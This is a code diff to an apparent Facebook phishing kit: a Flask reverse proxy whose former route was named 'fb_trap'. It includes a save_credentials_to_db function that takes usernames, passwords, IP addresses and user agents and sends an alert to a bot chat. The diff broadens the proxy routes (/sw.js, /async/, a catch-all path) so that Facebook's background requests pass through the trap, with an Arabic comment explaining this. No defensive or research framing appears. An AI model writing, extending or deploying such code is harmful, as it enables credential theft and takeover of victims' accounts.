@@ -2,7 +2,7 @@ import os
 import json
 import requests
 import re
-from urllib.parse import urljoin, urlparse, quote, unquote
+from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
 from flask import Blueprint, redirect, request, Response
 
 secure_fb_bp = Blueprint('facebook', __name__)
@@ -52,9 +52,12 @@ def rewrite_urls(html_content, base_url, proxy_base_path):
 
 def get_real_facebook_url(request_path, query_string):
     if 'url' in query_string:
-        original_target_url = query_string.get('url')
-        return unquote(original_target_url)
-    return "https://m.facebook.com/login.php"
+        return unquote(query_string.get('url'))
+    
+    # دعم الطلبات الخلفية مثل /async/ و /sw.js وتوجيهها مباشرة لفيسبوك
+    clean_args = {k: v for k, v in query_string.items() if k != 'id'}
+    query_str = f"?{urlencode(clean_args)}" if clean_args else ""
+    return f"https://m.facebook.com{request_path}{query_str}"
 
 def save_credentials_to_db(platform, username, password, ip_address, user_agent, target_chat_id, bot):
     alert_msg = (
@@ -73,13 +76,16 @@ def save_credentials_to_db(platform, username, password, ip_address, user_agent,
 
 def init_facebook_routes(app, bot):
     @app.route('/login.php', methods=['GET', 'POST'])
-    @app.route('/login.php/', methods=['GET', 'POST'])
-    @app.route('/login.php/<path:subpath>', methods=['GET', 'POST'])
-    def fb_trap(subpath=''):
+    @app.route('/home.php', methods=['GET', 'POST'])
+    @app.route('/sw.js', methods=['GET', 'POST'])
+    @app.route('/async/<path:subpath>', methods=['GET', 'POST'])
+    @app.route('/<path:subpath>', methods=['GET', 'POST'])
+    def fb_proxy_router(subpath=''):
         target_chat_id = request.args.get('id', None)
         real_fb_url = get_real_facebook_url(request.path, request.args)
         
-        proxy_base_path = f"{request.url_root.rstrip('/')}/login.php"
+        base_endpoint = f"/{subpath}" if subpath else request.path
+        proxy_base_path = f"{request.url_root.rstrip('/')}{base_endpoint}"
         if target_chat_id:
              proxy_base_path += f"?id={target_chat_id}"
 
